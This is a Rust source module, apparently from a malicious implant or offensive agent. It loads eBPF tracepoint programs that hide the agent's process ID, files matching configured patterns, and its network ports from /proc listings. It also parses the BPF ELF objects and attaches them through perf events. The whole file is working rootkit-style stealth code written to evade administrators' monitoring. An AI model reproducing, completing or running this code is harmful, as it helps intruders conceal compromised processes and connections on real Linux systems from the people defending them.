//! eBPF-based Linux evasion — hides the agent process, files, and network
//! connections from user-space monitoring tools using the kernel's eBPF
//! subsystem.
//!
//! # Architecture
//!
//! Three eBPF programs are loaded into the kernel:
//!
//! 1. **hide_process** — hooks `getdents64` to remove the agent's PID entry
//!    from `/proc` directory listings.
//! 2. **hide_files** — hooks `getdents64` to filter directory entries whose
//!    names match configured patterns.
//! 3. **hide_network** — hooks `read` to filter lines from `/proc/net/tcp`,
//!    `/proc/net/tcp6`, `/proc/net/udp`, `/proc/net/udp6` that match the
//!    agent's ports.
//!
//! # Requirements
//!
//! - Linux kernel >= 4.15 (tracepoint support) / >= 5.2 (recommended for
//!   `bpf_probe_write_user`).
//! - Root privileges **or** `CAP_BPF` + `CAP_SYS_ADMIN`.
//! - `clang` on the build host for eBPF C→BPF compilation.
//! - The `ebpf` feature flag (implies `direct-syscalls`).
//!
//! # Graceful Degradation
//!
//! If any step fails (insufficient privileges, no eBPF support, missing
//! kernel features), the module logs a warning and returns `Ok(())` — the
//! agent continues to run without eBPF evasion.  This ensures the agent
//! never crashes due to eBPF unavailability.

use anyhow::{Context, Result};
use std::os::unix::io::RawFd;

// ── BPF syscall constants ─────────────────────────────────────────────────

/// BPF syscall sub-commands
const BPF_MAP_CREATE: u64 = 0;
const BPF_MAP_LOOKUP_ELEM: u64 = 1;
const BPF_MAP_UPDATE_ELEM: u64 = 2;
const BPF_PROG_LOAD: u64 = 5;
const BPF_OBJ_GET: u64 = 6;
const BPF_LINK_CREATE: u64 = 11;

/// BPF map types
const BPF_MAP_TYPE_HASH: u32 = 1;
const BPF_MAP_TYPE_ARRAY: u32 = 2;
const BPF_MAP_TYPE_PERCPU_ARRAY: u32 = 5;

/// BPF program type
const BPF_PROG_TYPE_TRACEPOINT: u32 = 5;

/// log_level for BPF_PROG_LOAD
const BPF_LOG_LEVEL: u32 = 1;

/// BPF any (map update flag)
const BPF_ANY: u64 = 0;

/// perf_event ioctl commands
const PERF_EVENT_IOC_SET_BPF: u64 = 0x4004_2400_u64; // _IOW('$', 0, int) on most arches
const PERF_EVENT_IOC_ENABLE: u64 = 0x2400_u64;

/// perf_event_open: tracepoint type
const PERF_TYPE_TRACEPOINT: u32 = 2;

/// perf_event_header: sample type (minimal)
const PERF_SAMPLE_RAW: u64 = 1;

// ── ELF parsing helpers ───────────────────────────────────────────────────
//
// The compiled BPF object files are ELF64.  We parse them minimally to
// extract sections (maps, programs, license, version) without depending on
// an ELF crate.

#[repr(C)]
#[derive(Default, Clone)]
struct Elf64_Ehdr {
    e_ident: [u8; 16],
    e_type: u16,
    e_machine: u16,
    e_version: u32,
    e_entry: u64,
    e_phoff: u64,
    e_shoff: u64,
    e_flags: u32,
    e_ehsize: u16,
    e_phentsize: u16,
    e_phnum: u16,
    e_shentsize: u16,
    e_shnum: u16,
    e_shstrndx: u16,
}

#[repr(C)]
#[derive(Default, Clone)]
struct Elf64_Shdr {
    sh_name: u32,
    sh_type: u32,
    sh_flags: u64,
    sh_addr: u64,
    sh_offset: u64,
    sh_size: u64,
    sh_link: u32,
    sh_info: u32,
    sh_addralign: u64,
    sh_entsize: u64,
}

/// Minimal BPF ELF object representation.
struct BpfObject {
    /// Map section name → (offset_in_file, size)
    maps: Vec<(String, u64, u64)>,
    /// Program section name → (offset_in_file, size)
    programs: Vec<(String, u64, u64)>,
    /// License string
    license: String,
    /// Kernel version (0 = not specified)
    kern_version: u32,
    /// The raw ELF bytes
    raw: Vec<u8>,
}

/// Parse a minimal BPF ELF object, extracting map and program sections.
fn parse_bpf_elf(data: &[u8]) -> Result<BpfObject> {
    if data.len() < std::mem::size_of::<Elf64_Ehdr>() {
        anyhow::bail!("BPF ELF too small for header");
    }

    let ehdr: Elf64_Ehdr = unsafe {
        let mut h = Elf64_Ehdr::default();
        std::ptr::copy_nonoverlapping(data.as_ptr(), &mut h as *mut _ as *mut u8, std::mem::size_of::<Elf64_Ehdr>());
        h
    };

    // Verify ELF magic
    if &ehdr.e_ident[0..4] != b"\x7fELF" {
        anyhow::bail!("not an ELF file");
    }
    // Verify 64-bit, little-endian
    if ehdr.e_ident[4] != 2 {
        anyhow::bail!("not a 64-bit ELF");
    }

    let shoff = ehdr.e_shoff as usize;
    let shentsize = ehdr.e_shentsize as usize;
    let shnum = ehdr.e_shnum as usize;
    let shstrndx = ehdr.e_shstrndx as usize;

    if shoff == 0 || shnum == 0 || shstrndx >= shnum {
        anyhow::bail!("ELF has no section headers");
    }

    // Read section header string table
    let strtab_off = {
        let strtab_sh = read_shdr(data, shoff + shstrndx * shentsize)?;
        strtab_sh.sh_offset as usize
    };

    let mut maps = Vec::new();
    let mut programs = Vec::new();
    let mut license = String::from("GPL");
    let mut kern_version = 0u32;

    for i in 0..shnum {
        let shdr = read_shdr(data, shoff + i * shentsize)?;

        // Get section name from string table
        let name = get_strtab_string(data, strtab_off, shdr.sh_name as usize)?;

        if name == "license" {
            if shdr.sh_size > 0 && shdr.sh_offset as usize + shdr.sh_size as usize <= data.len() {
                license = String::from_utf8_lossy(
                    &data[shdr.sh_offset as usize..shdr.sh_offset as usize + shdr.sh_size as usize],
                )
                .trim_end_matches('\0')
                .to_string();
            }
        } else if name == "version" {
            if shdr.sh_size >= 4 && shdr.sh_offset as usize + 4 <= data.len() {
                kern_version = u32::from_le_bytes(
                    data[shdr.sh_offset as usize..shdr.sh_offset as usize + 4]
                        .try_into()?,
                );
            }
        } else if name.starts_with("maps") {
            maps.push((name, shdr.sh_offset, shdr.sh_size));
        } else if name.starts_with("tp/") || name.starts_with("tracepoint/") {
            programs.push((name, shdr.sh_offset, shdr.sh_size));
        }
    }

    Ok(BpfObject {
        maps,
        programs,
        license,
        kern_version,
        raw: data.to_vec(),
    })
}

fn read_shdr(data: &[u8], offset: usize) -> Result<Elf64_Shdr> {
    if offset + std::mem::size_of::<Elf64_Shdr>() > data.len() {
        anyhow::bail!("section header extends past end of ELF");
    }
    let shdr: Elf64_Shdr = unsafe {
        let mut h = Elf64_Shdr::default();
        std::ptr::copy_nonoverlapping(
            data.as_ptr().add(offset),
            &mut h as *mut _ as *mut u8,
            std::mem::size_of::<Elf64_Shdr>(),
        );
        h
    };
    Ok(shdr)
}

fn get_strtab_string(data: &[u8], strtab_off: usize, name_off: usize) -> Result<String> {
    let start = strtab_off + name_off;
    if start >= data.len() {
        anyhow::bail!("section name offset out of bounds");
    }
    let end = data[start..]
        .iter()
        .position(|&b| b == 0)
        .unwrap_or(data.len() - start);
    Ok(String::from_utf8_lossy(&data[start..start + end]).to_string())
}

// ── BPF unionattr (attr) for the bpf syscall ─────────────────────────────
//
// The bpf() syscall takes a union bpf_attr as the second argument.  We
// define the relevant sub-structs inline with the correct layout.

/// union bpf_attr for BPF_MAP_CREATE
#[repr(C)]
struct BpfMapCreate {
    map_type: u32,
    key_size: u32,
    value_size: u32,
    max_entries: u32,
    map_flags: u64,
    inner_map_fd: u32,
    numa_node: u32,
    map_name: [u8; 16],
    map_ifindex: u32,
    btf_fd: u32,
    btf_key_type_id: u32,
    btf_value_type_id: u32,
}

/// union bpf_attr for BPF_MAP_UPDATE_ELEM
#[repr(C)]
struct BpfMapUpdateElem {
    map_fd: u32,
    _pad0: u32,
    key: u64,
    value: u64,
    flags: u64,
}

/// union bpf_attr for BPF_PROG_LOAD
#[repr(C)]
struct BpfProgLoad {
    prog_type: u32,
    insn_cnt: u32,
    insns: u64,
    license: u64,
    log_level: u32,
    log_size: u32,
    log_buf: u64,
    kern_version: u32,
    prog_flags: u32,
    prog_name: [u8; 16],
    prog_ifindex: u32,
    expected_attach_type: u32,
    prog_btf_fd: u32,
    func_info_rec_size: u32,
    func_info: u64,
    func_info_cnt: u32,
    line_info_rec_size: u32,
    line_info: u64,
    line_info_cnt: u32,
}

/// Maximum union bpf_attr size — we use a fixed-size buffer.
const BPF_ATTR_SIZE: usize = 256;

/// Build a zeroed attr buffer.
fn zero_attr() -> [u8; BPF_ATTR_SIZE] {
    [0u8; BPF_ATTR_SIZE]
}

/// Write a struct into the attr buffer.
unsafe fn write_attr<T>(buf: &mut [u8; BPF_ATTR_SIZE], val: &T) {
    let src = val as *const T as *const u8;
    let len = std::mem::size_of::<T>();
    std::ptr::copy_nonoverlapping(src, buf.as_mut_ptr(), len.min(BPF_ATTR_SIZE));
}

// ── perf_event_open ───────────────────────────────────────────────────────

/// Arguments for perf_event_open (struct perf_event_attr).
#[repr(C)]
struct PerfEventAttr {
    type_: u32,
    size: u32,
    config: u64,
    sample_period: u64,
    sample_type: u64,
    read_format: u64,
    flags: u64,
    wakeup_events_or_watermark: u32,
    bp_type: u32,
    bp_addr_or_config1: u64,
    bp_len_or_config2: u64,
    branch_sample_type: u64,
    sample_regs_user: u64,
    sample_stack_user: u32,
    clockid: u32,
    sample_regs_intr: u64,
    aux_watermark: u32,
    sample_max_stack: u16,
    _reserved: u16,
}

/// Open a perf event for a tracepoint.
///
/// `tracepoint_id` is the numeric ID from
/// `/sys/kernel/debug/tracing/events/<category>/<name>/id`.
fn perf_event_open_tracepoint(tracepoint_id: u32) -> Result<RawFd> {
    let mut attr: PerfEventAttr = unsafe { std::mem::zeroed() };
    attr.type_ = PERF_TYPE_TRACEPOINT;
    attr.size = std::mem::size_of::<PerfEventAttr>() as u32;
    attr.config = tracepoint_id as u64;
    attr.sample_period = 1;
    attr.sample_type = PERF_SAMPLE_RAW;
    attr.wakeup_events_or_watermark = 1;

    let fd = unsafe {
        libc::syscall(
            libc::SYS_perf_event_open,
            &attr as *const _,
            -1i32 as libc::pid_t, // any process
            -1i32 as libc::c_int,  // all CPUs
            -1i32,                 // no group fd
            0u64,                  // no flags
        )
    };

    if fd < 0 {
        anyhow::bail!(
            "perf_event_open failed for tracepoint {}: errno {}",
            tracepoint_id,
            std::io::Error::last_os_error()
        );
    }

    Ok(fd as RawFd)
}

/// Read a tracepoint's numeric ID from debugfs.
fn read_tracepoint_id(category: &str, name: &str) -> Result<u32> {
    let path = format!("/sys/kernel/debug/tracing/events/{}/{}/id", category, name);
    let id_str = std::fs::read_to_string(&path)
        .with_context(|| format!("failed to read tracepoint ID from {}", path))?;
    id_str.trim().parse::<u32>().with_context(|| {
        format!("invalid tracepoint ID in {}: '{}'", path, id_str.trim())
    })
}

// ── ioctl helper ──────────────────────────────────────────────────────────

fn ioctl(fd: RawFd, request: u64, arg: u64) -> i64 {
    unsafe { libc::ioctl(fd, request as libc::c_ulong, arg) as i64 }
}

// ── BPF syscall wrapper ──────────────────────────────────────────────────

fn bpf_syscall(cmd: u64, attr: &[u8; BPF_ATTR_SIZE], size: usize) -> Result<u64> {
    crate::syscall!("bpf", cmd, attr.as_ptr() as u64, size as u64)
        .context("bpf syscall failed")
}

// ── EbpfManager ──────────────────────────────────────────────────────────

/// Manages loaded eBPF programs and their associated resources.
///
/// On drop, all file descriptors are closed, which automatically detaches
/// the eBPF programs from their tracepoints.
pub struct EbpfManager {
    /// perf event fds (for tracepoint attachment).  Closing these detaches.
    perf_fds: Vec<RawFd>,
    /// BPF program fds.
    prog_fds: Vec<RawFd>,
    /// BPF map fds (for userspace → kernel data sharing).
    map_fds: Vec<RawFd>,
    /// Whether evasion is active.
    active: bool,
}

impl Drop for EbpfManager {
    fn drop(&mut self) {
        self.cleanup();
    }
}

impl EbpfManager {
    /// Create an empty (inactive) manager.
    pub fn new() -> Self {
        EbpfManager {
            perf_fds: Vec::new(),
            prog_fds: Vec::new(),
            map_fds: Vec::new(),
            active: false,
        }
    }

    /// Load all eBPF evasion programs.
    ///
    /// This compiles and loads the three BPF programs into the kernel.
    /// Programs are NOT yet attached — call `attach_all()` afterwards.
    ///
    /// Returns `Ok(())` even on failure (graceful degradation).
    pub fn load_all(pid: u32, file_patterns: &[&str], ports: &[u16]) -> Result<Self> {
        let mut mgr = Self::new();

        // ── Process hiding ──────────────────────────────────────────────
        if let Err(e) = mgr.load_hide_process(pid) {
            log::warn!("ebpf: process hiding load failed (non-fatal): {e:#}");
            return Ok(Self::new());
        }

        // ── File hiding ─────────────────────────────────────────────────
        if let Err(e) = mgr.load_hide_files(file_patterns) {
            log::warn!("ebpf: file hiding load failed (non-fatal): {e:#}");
        }

        // ── Network hiding ──────────────────────────────────────────────
        if let Err(e) = mgr.load_hide_network(ports) {
            log::warn!("ebpf: network hiding load failed (non-fatal): {e:#}");
        }

        Ok(mgr)
    }

    /// Attach all loaded programs to their tracepoints.
    ///
    /// Must be called after `load_all()`.  Returns `Ok(())` even on
    /// partial failure (graceful degradation).
    pub fn attach_all(&mut self) -> Result<()> {
        if self.prog_fds.is_empty() {
            log::warn!("ebpf: no programs loaded, skipping attach");
            return Ok(());
        }

        // Attach programs to tracepoints.
        // We attach all programs to their respective tracepoints.
        // The order matches the load order: process → files → network.
        let tracepoints = [
            // hide_process: sys_enter_getdents64, sys_exit_getdents64
            ("syscalls", "sys_enter_getdents64"),
            ("syscalls", "sys_exit_getdents64"),
            // hide_files: sys_enter_getdents64, sys_exit_getdents64 (same tracepoints, different program)
            // Note: both programs share the same tracepoint — BPF handles multiple programs per TP.
            ("syscalls", "sys_enter_getdents64"),
            ("syscalls", "sys_exit_getdents64"),
            // hide_network: sys_enter_read, sys_exit_read
            ("syscalls", "sys_enter_read"),
            ("syscalls", "sys_exit_read"),
        ];

        let mut tp_idx = 0;
        for &prog_fd in &self.prog_fds {
            if tp_idx >= tracepoints.len() {
                log::warn!("ebpf: more programs than tracepoint slots");
                break;
            }

            let (cat, name) = tracepoints[tp_idx];
            tp_idx += 1;

            match Self::attach_program(prog_fd, cat, name) {
                Ok(perf_fd) => {
                    self.perf_fds.push(perf_fd);
                }
                Err(e) => {
                    log::warn!(
                        "ebpf: failed to attach program fd {} to {}:{} (non-fatal): {e:#}",
                        prog_fd,
                        cat,
                        name
                    );
                }
            }
        }

        if !self.perf_fds.is_empty() {
            self.active = true;
            log::info!(
                "ebpf: evasion active ({} programs attached)",
                self.perf_fds.len()
            );
        }

        Ok(())
    }

    /// Whether evasion is currently active.
    pub fn is_active(&self) -> bool {
        self.active
    }

    /// Detach all programs and close all file descriptors.
    pub fn cleanup(&mut self) {
        for &fd in &self.perf_fds {
            if fd >= 0 {
                unsafe {
                    libc::close(fd);
                }
            }
        }
        for &fd in &self.prog_fds {
            if fd >= 0 {
                unsafe {
                    libc::close(fd);
                }
            }
        }
        for &fd in &self.map_fds {
            if fd >= 0 {
                unsafe {
                    libc::close(fd);
                }
            }
        }
        self.perf_fds.clear();
        self.prog_fds.clear();
        self.map_fds.clear();
        self.active = false;
        log::debug!("ebpf: all programs detached and cleaned up");
    }

    // ── Internal loading methods ──────────────────────────────────────────

    /// Load the process-hiding eBPF program.
    fn load_hide_process(&mut self, pid: u32) -> Result<()> {
        let elf_bytes = get_ebpf_bytes("hide_process")?;
        if elf_bytes.is_empty() {
            anyhow::bail!("hide_process BPF bytecode is empty (clang not available at build time?)");
        }

        let obj = parse_bpf_elf(&elf_bytes)
            .context("failed to parse hide_process BPF ELF")?;

        // Create the pid_map (ARRAY, key=u32, value=u32, max_entries=1)
        let pid_map_fd = self.create_map(BPF_MAP_TYPE_ARRAY, 4, 4, 1, "pid_map")?;
        self.map_fds.push(pid_map_fd);

        // Populate pid_map with the agent's PID
        let mut key_buf = 0u32.to_le_bytes();
        let mut val_buf = pid.to_le_bytes();
        self.update_map(pid_map_fd, &mut key_buf, &mut val_buf)?;

        // Load programs from the ELF
        self.load_programs_from_elf(&obj)?;

        Ok(())
    }

    /// Load the file-hiding eBPF program.
    fn load_hide_files(&mut self, patterns: &[&str]) -> Result<()> {
        let elf_bytes = get_ebpf_bytes("hide_files")?;
        if elf_bytes.is_empty() {
            anyhow::bail!("hide_files BPF bytecode is empty");
        }

        let obj = parse_bpf_elf(&elf_bytes)
            .context("failed to parse hide_files BPF ELF")?;

        // Create hide_patterns map (HASH, key=u32, value=[u8;64], max_entries=32)
        let patterns_fd = self.create_map(BPF_MAP_TYPE_HASH, 4, 64, 32, "hide_patterns")?;
        self.map_fds.push(patterns_fd);

        // Populate patterns
        for (i, pat) in patterns.iter().enumerate().take(32) {
            let mut key_buf = (i as u32).to_le_bytes();
            let mut val_buf = [0u8; 64];
            let bytes = pat.as_bytes();
            let copy_len = bytes.len().min(63);
            val_buf[..copy_len].copy_from_slice(&bytes[..copy_len]);
            self.update_map(patterns_fd, &mut key_buf, &mut val_buf)?;
        }

        self.load_programs_from_elf(&obj)?;

        Ok(())
    }

    /// Load the network-hiding eBPF program.
    fn load_hide_network(&mut self, ports: &[u16]) -> Result<()> {
        let elf_bytes = get_ebpf_bytes("hide_network")?;
        if elf_bytes.is_empty() {
            anyhow::bail!("hide_network BPF bytecode is empty");
        }

        let obj = parse_bpf_elf(&elf_bytes)
            .context("failed to parse hide_network BPF ELF")?;

        // Create port_map (ARRAY, key=u32, value=u32, max_entries=8)
        let port_map_fd = self.create_map(BPF_MAP_TYPE_ARRAY, 4, 4, 8, "port_map")?;
        self.map_fds.push(port_map_fd);

        // Populate ports
        for (i, &port) in ports.iter().enumerate().take(8) {
            let mut key_buf = (i as u32).to_le_bytes();
            let mut val_buf = (port as u32).to_le_bytes();
            self.update_map(port_map_fd, &mut key_buf, &mut val_buf)?;
        }

        self.load_programs_from_elf(&obj)?;

        Ok(())
    }

    // ── BPF map operations ────────────────────────────────────────────────

    /// Create a BPF map.
    fn create_map(
        &mut self,
        map_type: u32,
        key_size: u32,
        value_size: u32,
        max_entries: u32,
        _name: &str,
    ) -> Result<RawFd> {
        let mut create: BpfMapCreate = unsafe { std::mem::zeroed() };
        create.map_type = map_type;
        create.key_size = key_size;
        create.value_size = value_size;
        create.max_entries = max_entries;
        // Copy name (first 15 bytes, null-terminated)
        let name_bytes = _name.as_bytes();
        let copy_len = name_bytes.len().min(15);
        create.map_name[..copy_len].copy_from_slice(&name_bytes[..copy_len]);

        let mut attr = zero_attr();
        unsafe { write_attr(&mut attr, &create) };

        let fd = bpf_syscall(BPF_MAP_CREATE, &attr, std::mem::size_of::<BpfMapCreate>())?;
        Ok(fd as RawFd)
    }

    /// Update a BPF map entry.
    fn update_map(&self, map_fd: RawFd, key: &mut [u8], value: &mut [u8]) -> Result<()> {
        let mut update: BpfMapUpdateElem = unsafe { std::mem::zeroed() };
        update.map_fd = map_fd as u32;
        update.key = key.as_mut_ptr() as u64;
        update.value = value.as_mut_ptr() as u64;
        update.flags = BPF_ANY;

        let mut attr = zero_attr();
        unsafe { write_attr(&mut attr, &update) };

        bpf_syscall(
            BPF_MAP_UPDATE_ELEM,
            &attr,
            std::mem::size_of::<BpfMapUpdateElem>(),
        )?;
        Ok(())
    }

    // ── BPF program loading ───────────────────────────────────────────────

    /// Load all programs from a parsed BPF ELF object.
    fn load_programs_from_elf(&mut self, obj: &BpfObject) -> Result<()> {
        for (section_name, offset, size) in &obj.programs {
            let off = *offset as usize;
            let sz = *size as usize;

            if off + sz > obj.raw.len() {
                log::warn!(
                    "ebpf: program section '{}' extends past ELF end, skipping",
                    section_name
                );
                continue;
            }

            let insns = &obj.raw[off..off + sz];
            let insn_cnt = (insns.len() / 8) as u32; // BPF insns are 8 bytes each

            if insn_cnt == 0 {
                continue;
            }

            let mut load: BpfProgLoad = unsafe { std::mem::zeroed() };
            load.prog_type = BPF_PROG_TYPE_TRACEPOINT;
            load.insn_cnt = insn_cnt;
            load.insns = insns.as_ptr() as u64;
            load.license = obj.license.as_ptr() as u64;
            load.log_level = 0; // Disable log for now; enable for debugging
            load.kern_version = obj.kern_version;

            let mut attr = zero_attr();
            unsafe { write_attr(&mut attr, &load) };

            match bpf_syscall(BPF_PROG_LOAD, &attr, std::mem::size_of::<BpfProgLoad>()) {
                Ok(fd) => {
                    log::debug!(
                        "ebpf: loaded program from section '{}' ({} insns) → fd {}",
                        section_name,
                        insn_cnt,
                        fd
                    );
                    self.prog_fds.push(fd as RawFd);
                }
                Err(e) => {
                    log::warn!(
                        "ebpf: failed to load program from section '{}': {e:#}",
                        section_name
                    );
                    // Continue loading other programs
                }
            }
        }
        Ok(())
    }

    // ── Attachment ────────────────────────────────────────────────────────

    /// Attach a BPF program to a tracepoint.
    fn attach_program(prog_fd: RawFd, category: &str, name: &str) -> Result<RawFd> {
        let tp_id = read_tracepoint_id(category, name)?;

        let perf_fd = perf_event_open_tracepoint(tp_id)?;

        if ioctl(perf_fd, PERF_EVENT_IOC_SET_BPF, prog_fd as u64) < 0 {
            let err = std::io::Error::last_os_error();
            unsafe {
                libc::close(perf_fd);
            }
            anyhow::bail!(
                "PERF_EVENT_IOC_SET_BPF failed for {}:{}: {}",
                category,
                name,
                err
            );
        }

        if ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0) < 0 {
            let err = std::io::Error::last_os_error();
            unsafe {
                libc::close(perf_fd);
            }
            anyhow::bail!(
                "PERF_EVENT_IOC_ENABLE failed for {}:{}: {}",
                category,
                name,
                err
            );
        }

        log::debug!(
            "ebpf: attached program fd {} to tracepoint {}:{} (perf_fd {})",
            prog_fd,
            category,
            name,
            perf_fd
        );

        Ok(perf_fd)
    }
}

// ── Bytecode retrieval ────────────────────────────────────────────────────

/// Get the compiled BPF bytecode for a program by name.
///
/// The bytecode is embedded at compile time by `build.rs` via
/// `cargo:rustc-env=EBPF_<NAME>=<hex>`.
fn get_ebpf_bytes(program_name: &str) -> Result<Vec<u8>> {
    // Use option_env! with known program names — the build.rs emits:
    //   cargo:rustc-env=EBPF_HIDE_PROCESS=...
    //   cargo:rustc-env=EBPF_HIDE_FILES=...
    //   cargo:rustc-env=EBPF_HIDE_NETWORK=...
    let hex = match program_name {
        "hide_process" => option_env!("EBPF_HIDE_PROCESS").unwrap_or(""),
        "hide_files" => option_env!("EBPF_HIDE_FILES").unwrap_or(""),
        "hide_network" => option_env!("EBPF_HIDE_NETWORK").unwrap_or(""),
        _ => "",
    };

    if hex.is_empty() {
        return Ok(Vec::new());
    }

    let bytes: Result<Vec<u8>> = (0..hex.len())
        .step_by(2)
        .map(|i| {
            u8::from_str_radix(&hex[i..i + 2], 16)
                .context(format!("invalid hex at position {} in EBPF_{}", i, program_name.to_uppercase()))
        })
        .collect();

    bytes
}

// ── Public API ────────────────────────────────────────────────────────────

/// Initialize eBPF evasion.
///
/// Call this from `Agent::run()` after environment validation.  Loads and
/// attaches all three evasion programs.  Returns an `EbpfManager` that
/// cleans up on drop.
///
/// On failure, logs a warning and returns an inactive manager (graceful
/// degradation — the agent continues without eBPF evasion).
pub fn init(pid: u32, file_patterns: &[&str], ports: &[u16]) -> EbpfManager {
    log::info!("ebpf: initializing evasion (pid={}, {} patterns, {} ports)", pid, file_patterns.len(), ports.len());

    let mut mgr = match EbpfManager::load_all(pid, file_patterns, ports) {
        Ok(m) => m,
        Err(e) => {
            log::warn!("ebpf: load failed (non-fatal): {e:#}");
            return EbpfManager::new();
        }
    };

    if let Err(e) = mgr.attach_all() {
        log::warn!("ebpf: attach failed (non-fatal): {e:#}");
    }

    if mgr.is_active() {
        log::info!("ebpf: evasion successfully initialized");
    } else {
        log::warn!("ebpf: evasion not active (likely insufficient privileges)");
    }

    mgr
}
